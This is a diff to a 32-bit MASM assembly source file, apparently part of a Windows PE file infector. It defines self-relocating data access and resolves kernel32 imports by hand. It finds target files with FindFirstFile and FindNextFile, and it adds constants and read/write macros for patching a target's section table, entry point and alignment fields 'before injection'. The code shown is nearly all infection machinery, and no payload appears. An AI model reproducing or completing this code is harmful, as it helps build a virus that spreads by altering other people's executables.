@@ -11,14 +11,26 @@ option casemap: none
 	selfImageBaseAddress EQU 1
 	selfSection EQU 2
 	selfEntry EQU 3
-	fileHand EQU 4 ; From FindFirstFile, for FindNextFile
 	selfHand EQU 4
-	tgHand EQU 5
 	
+	tgHand EQU 5
 	tgImageBaseAddress EQU 1
-    tgOldEntry EQU 2
     tgNewSection EQU 3
 	tgNewEntry EQU 4
+	lfanew EQU 5
+	NumberOfSections EQU 6 ; Before injection
+	SizeOfOptionalHeader EQU 7
+	ioh_offset EQU 8
+	Magic EQU 9 ; 10Bh => 32=bit; 20Bh => 64-bit
+	AddressOfEntryPoint EQU 10
+	SectionAlignment EQU 11
+	FileAlignment EQU 12
+	lastish_offset EQU 14
+	lastish_SectionOffset EQU 13
+	lastish_VA EQU 15
+	lastish_SizeOfRawData EQU 16
+	newish_offset EQU 17
+	
 	
     kernel32dll EQU 5
     OrdinalTbl EQU 6
@@ -27,6 +39,7 @@ option casemap: none
     k32NumFunc EQU 9
     user32dll EQU 10
     
+	fileHand EQU 4 ; From FindFirstFile, for FindNextFile
     ffind1 EQU 12 		; FindFirstFileA
     ffind2 EQU 13 		; FindNextFileA
     ffind0 EQU 14 		; FindClose
@@ -40,8 +53,13 @@ option casemap: none
     getaddr EQU 18 		; GetProcAddress
     msgbox EQU 19 		; MessageBoxA
     
+    ; Other constants for readability
     stack_reserved EQU 10 ; Number of values to be stored in the stack
     regSz EQU 4 ; 8 for 64-bit
+    
+    SEEK_SET EQU 0
+    SEEK_CUR EQU 1
+    SEEK_END EQU 2
 
 stackAddr MACRO pos:REQ
 	LOCAL temp
@@ -63,6 +81,11 @@ daccess MACRO pStr:REQ
 	LOCAL address
 	address = pStr - data_start + fromStack(selfSection)
 	EXITM <address>
+ENDM
+
+; Accessing values in data regions
+vaccess MACRO pStr:REQ
+	EXITM <DWORD PTR [daccess(pStr)]>
 ENDM
 
 k32import MACRO pFunc:REQ
@@ -99,4 +122,52 @@ k32import MACRO pFunc:REQ
 	; eax now hold mem addr of function pointed to by pFunc
 ENDM
 	
+getval MACRO handle:REQ, length:REQ, whence:=<SEEK_CUR>, disp:=<0>
+	; handle MUST be obtained from stack beforehand
+	; length should not be greater than 4 (32-bit)
+;	LOCAL storage
+;	IF length EQ 1
+;		storage = daccess(offset tempByte)
+;	ELSEIF length EQ 2
+;		storage = daccess(offset tempWord)
+;	ELSE
+;		storage = daccess(offset tempDword)
+;	ENDIF
+	mov vaccess(offset tempDword), 0
 	
+	invoke fromStack(fseek), handle, disp, 0, whence
+	
+	push 0
+	push daccess(offset tempDword2)
+	push length
+	push daccess(offset tempDword)
+	push handle
+	call fromStack(fread)
+	; Retrieved value is stored in tempDword, depending on length
+ENDM
+
+setval MACRO handle:REQ, length:REQ, whence:=<SEEK_CUR>, disp:=<0>
+	; handle MUST be obtained from stack beforehand
+;	LOCAL storage
+;	IF length EQ 1
+;		storage = daccess(offset tempByte)
+;	ELSEIF length EQ 2
+;		storage = daccess(offset tempWord)
+;	ELSE
+;		storage = daccess(offset tempDword)
+;	ENDIF
+	
+	invoke fromStack(fseek), handle, disp, 0, whence
+	
+	invoke fromStack(fwrite), handle, daccess(tempDword), length, daccess(tempDword2), 0
+ENDM
+
+closest MACRO actual:REQ, alignment:REQ
+	mov eax, actual
+	xor edx, edx
+	mov esi, alignment
+	idiv esi
+	inc eax
+	imul eax, alignment
+	; Result is stored in eax
+ENDM
